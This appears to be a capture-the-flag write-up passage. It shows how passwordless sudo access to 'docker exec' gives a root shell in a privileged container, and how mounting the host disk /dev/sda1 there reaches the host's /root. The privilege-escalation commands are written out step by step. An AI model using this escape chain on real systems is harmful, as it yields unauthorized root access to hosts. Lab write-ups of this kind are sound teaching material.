
Inspected user "boris" sudo permissions.

```
sudo -l
Matching Defaults entries for boris on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User boris may run the following commands on localhost:
    (root) NOPASSWD: /snap/bin/docker exec *
```

Being able to run the docker binary with root permissions is a big win. We can immediatly get root in an docker container, by doing the following commands:

We can enumerate running docker containers like this.

```
docker ps
```

Unfortunately this didn't work.

We can still check the running processes and see an active docker instance.

```
ps auxww | grep docker
```

```
There's an ID for a running container, e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81.
```

The docker exec subcommand takes a container and a command, and has several options:

We can get shell on a running container executing the following command: 

```
docker exec -it <container name> bash
```

But since we want the highest privileges possible on the docker image, let's get root by running the following command:

```
/snap/bin/docker exec -it --privileged --user root e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 bash
```

We now got root permissions on the docker container. In order to be able to get the root.txt we need to somehow break out the container! 

An classic way to break out an container is simply by checking for mounted devices.

```
mount
```

There is nothing interesting, but let's maybe check on the host system, by closing our docker root session and going back to our ssh session with user "boris".

```
mount
```

This actually revealed /dev/sda1 being mounted onto the root filesystem /. Let's mount /dev/sda1 into the docker container in /mnt. Why? Since the entire filesystem of the server is mounted to this hard disk, we can get access to the root directory inside the docker container.

Navigating back to the container itself.

```
sudo docker exec -it --privileged --user root e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 bash
```

Mounted the harddisk in which the entire filesystem of the host system is mounted into the docker container.

```
mount /dev/sda1 /mnt/
```

We now got the whole file system in /mnt directory and can access the /root's directory!